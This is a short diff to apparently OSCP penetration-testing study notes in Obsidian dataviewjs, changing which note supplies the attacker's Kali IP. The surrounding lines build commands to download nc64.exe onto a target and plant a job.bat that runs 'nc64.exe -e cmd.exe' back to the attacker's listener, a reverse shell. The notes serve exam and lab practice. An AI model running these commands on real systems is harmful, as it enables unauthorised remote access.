@@ -20,7 +20,7 @@ python3 -m http.server 8000
 
 Transfer nc64.exe onto target machine
 ```dataviewjs
-const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `wget http://${KaliIP}:[port_no]/nc64.exe -outfile nc64.exe`;
 
@@ -33,7 +33,7 @@ nc -lvnp 4444
 
 Attach the command to the tricked program to execute nc64.exe
 ```dataviewjs
-const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `echo C:\\FILE_LOCATION\\nc64.exe -e cmd.exe ${KaliIP} {LISTENER_PORT} > C:\\FILE_LOCATION\\job.bat`;
 
